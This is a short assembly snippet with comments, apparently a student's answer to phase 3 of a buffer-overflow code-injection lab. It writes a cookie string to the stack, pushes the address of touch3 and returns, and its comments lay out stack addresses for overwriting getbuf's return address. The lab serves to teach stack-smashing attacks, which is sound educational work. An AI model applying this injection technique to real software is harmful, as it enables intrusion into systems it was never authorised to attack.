movabsq $0x6166373939623935, %rdi
movq %rdi, -0x400(%rsp)
movl $0, -0x3f8(%rsp)
movl $0x5561d8a8,%edi
pushq $0x4018fa # address of touch3
ret

# (0x5561dca0) 0x4  bytes overwrite address -> ???
# 2. When getbuf return: %rsp=0x5561dca0 -> 0x5561dca8
# (0x5561dc78) 0x28 bytes for instruction
# 1. getbuf: %rsp=0x5561dc78
# 3. Instruction write the following string:
# (0x5561d8a8) 0x9  bytes for string, 0x59b997fa -> 35 39 62 39 39 37 66 61 00

# WRITE below %rsp to save instructions. Is it valid????
